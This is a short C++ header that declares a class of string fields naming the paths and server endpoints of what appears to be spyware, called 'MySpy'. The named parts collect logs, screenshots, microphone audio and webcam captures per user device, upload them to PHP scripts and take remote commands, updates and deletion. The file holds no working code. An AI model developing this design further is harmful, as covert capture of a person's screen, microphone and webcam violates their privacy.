// Filename: class.base.h
// Author:   Patryk Po³eæ

#pragma once

class C_Base
{
	// Constructor and destructor
	public:
		C_Base();
		~C_Base();

	// Public methods
	public:

	// Private methods
	private:
	    
	// Public fields
	public:
		string
			pathTemp,
			pathUser,

			client,

			ncdData,
			ncdDataLogs,
			ncdDataScreens,
			ncdDataSoundMic,
			ncdDataWebCam,

			pcdData,
			pcdDataLogs,
			pcdDataScreens,
			pcdDataSoundMic,
			pcdDataWebCam,
			
			ncfMySpyExe,
			ncfDeleteExe,
			ncfUpdateExe,

			pcfMySpyExe,
			pcfDeleteExe,
			pcfUpdateExe,

			server,

			nsdApi,
			nsdUsers,
			nsdUsersUser,
			nsdUsersDelete,
			nsdUsersUpdate,
			nsdUsersUserDevice,
			nsdUsersUserDeviceData,
			nsdUsersUserDeviceDataLogs,
			nsdUsersUserDeviceDataScreens,
			nsdUsersUserDeviceDataSoundMic,
			nsdUsersUserDeviceDataWebCam,

			psdApi,
			psdUsers,
			psdUsersUser,
			psdUsersDelete,
			psdUsersUpdate,
			psdUsersUserDevice,
			psdUsersUserDelete,
			psdUsersUserUpdate,
			psdUsersUserDeviceData,
			psdUsersUserDeviceDelete,
			psdUsersUserDeviceUpdate,
			psdUsersUserDeviceDataLogs,
			psdUsersUserDeviceDataScreens,
			psdUsersUserDeviceDataSoundMic,
			psdUsersUserDeviceDataWebCam,
			
			nsfApiCheckCommandPhp,
			nsfApiSaveFilePhp,
			nsfApiSaveScreenPhp,

			nsfUsersDeleteExe,
			nsfUsersUpdateExe,

			psfApiCheckCommandPhp,
			psfApiSaveFilePhp,
			psfApiSaveScreenPhp,

			psfUsersDeleteExe,
			psfUsersUpdateExe,

			psfUsersUserDeleteExe,
			psfUsersUserUpdateExe,

			psfUsersUserDeviceDeleteExe,
			psfUsersUserDeviceUpdateExe;

		char
			bufferChar[256];

	// Private fields
	private:

};